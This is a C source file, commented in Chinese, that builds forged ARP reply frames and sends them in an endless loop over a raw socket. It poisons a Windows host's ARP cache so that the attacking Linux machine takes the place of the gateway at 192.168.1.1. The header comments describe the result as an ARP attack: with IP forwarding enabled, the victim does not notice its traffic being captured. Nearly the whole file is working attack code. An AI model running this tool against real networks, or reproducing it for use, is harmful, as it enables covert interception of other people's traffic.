//这个功能的效果是构造ARP攻击：
//mac地址为00:0C:29:42:44:99的linux主机A，
//向mac地址为00:1A:4B:63:27:07的win7主机B不断发送ARP响应包，格式为：
//源IP：192.168.1.1
//源MAC地址：00:0C:29:42:44:99
//目的IP：192.168.1.199
//目的MAC地址：00:1A:4B:63:27:07
//这样win7主机的ARP缓存记录由原来的
//192.168.1.1           38-83-45-8d-5b-96     dynamic
//在高频率的ARP应答包的冲击下，根据ARP协议机制，主机B更改ARP缓存记录：
//192.168.1.1           00-0c-29-42-44-99     dynamic
//这时ARP攻击完成，win7主机B的网关变为linux主机A，
//如果linux主机A开启了ip_forward即net.ipv4.ip_forward = 1
//并且linux主机A可以正常上网，那么win7主机也可以正常上网，
//完全感觉不到已经被吸收了流量。
//如果主机A修改了网关不能上网，或者关闭了ip_forward，那么主机B也不能上网。

#include	"arp.h"

//int main(int argc, char **argv)

int creator_arp(void)
{
	char *src_ip, *dst_ip, *src_mac, *dst_mac;
	struct sockaddr_ll device;
	uint8_t *ether_frame;
	int frame_length;
	int dst_mac_arr[6] = DST_MAC;

	src_mac = malloc(6);
	dst_mac = malloc(8);

	src_ip = SRC_IP;
	dst_ip = DST_IP;

	ether_frame = (uint8_t *) malloc(100 * sizeof(uint8_t));;

	int i;
	for (i = 0; i < 6; i++) {
		*(dst_mac + i) = dst_mac_arr[i];
		if (i < 5) {
			printf("%02x:", *(dst_mac + i));
		} else {
			printf("%02x\n", *(dst_mac + i));
		}
	}

	mac_local(src_mac);
	get_ifindex(&device);

	frame_length =
	    arphdr_build(src_mac, dst_mac, src_ip, dst_ip, ether_frame);

	printf("===%d==\n", frame_length);

	send_arp(&device, ether_frame, frame_length);

	return 0;
}

int mac_local(uint8_t * src_mac)
{
	int sockfd_getmac;
	struct ifreq ifr;
//      uint8_t *src_mac;

	//下面这个套接字用于获取本地网卡eth0的mac地址
	sockfd_getmac = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	//使用ioctl来解析本地mac地址
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", INTERFACE);
	ioctl(sockfd_getmac, SIOCGIFHWADDR, &ifr);
	close(sockfd_getmac);

	//保存本地网卡mac地址
	memcpy(src_mac, ifr.ifr_hwaddr.sa_data, 6 * sizeof(uint8_t));

	//打印本地网卡的mac地址，这是一个6字节的数组，要打印出标准格式
	//需要先循环前面5个字节，最后一个字节不带:冒号即可
	int i;
	for (i = 0; i < 5; i++) {
		printf("%02x:", src_mac[i]);
	}
	printf("%02x\n", src_mac[5]);

	return 0;
}

int get_ifindex(struct sockaddr_ll *point_dev)
{

	//获取接口eth0的索引
	memset(point_dev, 0, sizeof(struct sockaddr_ll));
	if (((*point_dev).sll_ifindex = if_nametoindex(INTERFACE))
	    == 0) {
		perror("if_nametoindex() failed to obtain interface index ");
		exit(EXIT_FAILURE);
	}
	printf("Index for interface %s is %i\n", INTERFACE,
	       (*point_dev).sll_ifindex);
	return 0;
}

int
arphdr_build(uint8_t * src_mac, uint8_t * dst_mac, char *src_ip,
	     char *dst_ip, uint8_t * ether_frame)
{
	int frame_length;
	char buf[100];
	memset(buf, '\0', sizeof(buf));
	struct arphdr *arphdr = (struct arphdr *)buf;

//        printf("the dst_mac is %s====\n", dst_mac[1]);

	//####################################################################
	//ARP报文共9个字段，前4个是基本固定的，
	arphdr->ar_hrd = htons(1);
	arphdr->ar_pro = htons(ETH_P_IP);
	arphdr->ar_hln = 6;
	arphdr->ar_pln = 4;

	//第5个是设置ARP操作码即请求或响应
	//arphdr->ar_op = htons(ARPOP_REQUEST);
	arphdr->ar_op = htons(ARPOP_REPLY);

	//ARP报文后面4个字段分别是：
	//第6个字段:Sender Mac address
	memcpy(arphdr->__ar_sha, src_mac, 6 * sizeof(uint8_t));

	//第7个字段:Sender IP address:
	//注意:这里必须用inet_pton是把点分十进制的字符串ip转换为二进制的ip
	//inet_ntop则刚好相反。这里不能用memcpy来直接赋值，
	//如果用memcpy赋值，程序会直接读取src_ip的前4个字节的asci码值的16进制作为IP地址
	//memcpy(arphdr->__ar_sip, src_ip, 4 * sizeof(uint8_t));
	inet_pton(AF_INET, src_ip, arphdr->__ar_sip);

	//第8个字段:Target Mac address:
	//下面这句表示mac地址的6个字节全部置为0xff，即广播地址
	//memset(arphdr->__ar_tha, 0xff, 6 * sizeof(uint8_t));
	//下面是分别设置mac的每个字节，目前没有比下面的代码更简便的方式：
	//如果不填充数据到__ar_tha，那么目的mac地址是随机的。
	memcpy(arphdr->__ar_tha, dst_mac, 6 * sizeof(uint8_t));

	//第9个字段:Taget IP address:
	inet_pton(AF_INET, dst_ip, arphdr->__ar_tip);

	//统计ARP报文总长度，不像TCP，UDP，ARP的9个字段的长度都是固定的，总长14+28=42字节
	//但是wireshark工作在数据链路层，也就是说收到的ARP包都是60字节，但发出的包是42字节
	frame_length = 6 + 6 + 2 + ARP_HDRLEN;

	// Destination and Source MAC addresses
	memcpy(ether_frame, dst_mac, 6 * sizeof(uint8_t));
	memcpy(ether_frame + 6, src_mac, 6 * sizeof(uint8_t));

	//指定以太帧的类型字段为0806即ARP,ETH_P_ARP即2054除以256等于8余数是6,都小于16所以不需要转换进制
	ether_frame[12] = ETH_P_ARP / 256;
	ether_frame[13] = ETH_P_ARP % 256;

	//填充ARP报头，这里直接使用arphdr，而不是&arphdr
	memcpy(ether_frame + ETH_HDRLEN, arphdr, ARP_HDRLEN * sizeof(uint8_t));

	return frame_length;
}

int
send_arp(struct sockaddr_ll *point_dev, uint8_t * ether_frame, int frame_length)
{
	int sockfd;
	int ret;

	//创建基于帧的原始套接字
	sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	printf("the ether_frame is %s=========\n", ether_frame);

	while (1) {
		ret =
		    sendto(sockfd, ether_frame, frame_length, 0,
			   (struct sockaddr *)point_dev,
			   sizeof(struct sockaddr_ll));
		perror("sendto");
		printf("the ret is %d and send arp finished===\n", ret);
		sleep(1);
	}

	close(sockfd);

	return 0;
}
